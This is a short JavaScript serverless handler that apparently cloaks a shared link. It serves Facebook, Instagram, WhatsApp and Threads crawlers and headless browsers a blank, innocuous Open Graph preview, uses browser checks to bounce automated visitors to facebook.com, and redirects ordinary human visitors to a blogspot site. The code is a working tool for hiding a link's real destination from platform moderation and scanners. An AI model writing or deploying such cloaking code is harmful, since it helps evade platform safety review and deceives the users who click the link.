export default function handler(req, res) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();

  const isFacebookBot = ua.includes('facebookexternalhit') ||
                        ua.includes('facebot') ||
                        ua.includes('facebookplatform') ||
                        ua.includes('instagram') ||
                        ua.includes('whatsapp') ||
                        ua.includes('threads');

  const isHeadlessBotUA = ua.includes('headless') ||
                          ua.includes('puppeteer') ||
                          ua.includes('phantom') ||
                          ua.includes('selenium');

  if (isFacebookBot || isHeadlessBotUA) {
    res.setHeader('Content-Type', 'text/html');
    res.end(`
      <html>
        <head>
          <meta property="og:title" content="&#8203;" />
          <meta property="og:description" content="" />
          <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4vyWL6EJrmdmh5IOmt7cGz-GpxdLFgF5qHJTMzRFF0Rma1014mNEKrY8xdgkl952JsVR8HHdYHrlS5lqyFOp79YYzz4EGXCBO7C1Ah1TjMXvu1_4P2d_Zgw5UhBk-fNBmCS32gT4QlbGAxh308MgcUbevLfYoeqdlJ8XnFnFHSs2QjDAiWodQLAMa4E0/w640-h360/Tiger%203%20(1).jpg" />
          <meta property="og:url" content="https://facebook.com/empty" />
          <script>
            (function() {
              let isBot = false;
              if (navigator.webdriver) isBot = true;
              if (window.outerWidth < 400 || window.outerHeight < 400) isBot = true;
              try {
                localStorage.setItem('botCheck', 'yes');
              } catch(e) {
                isBot = true;
              }
              let isHuman = false;
              window.addEventListener('mousemove', () => { isHuman = true; });
              window.addEventListener('scroll', () => { isHuman = true; });
              setTimeout(() => {
                if (isBot || !isHuman) {
                  window.location.href = 'https://facebook.com';
                }
              }, 3000);
            })();
          </script>
        </head>
        <body>
          <p>Facebook or Headless Bot Preview</p>
        </body>
      </html>
    `);
  } else {
    res.writeHead(302, {
      Location: 'https://screeninsiderhub.blogspot.com'
    });
    res.end();
  }
}
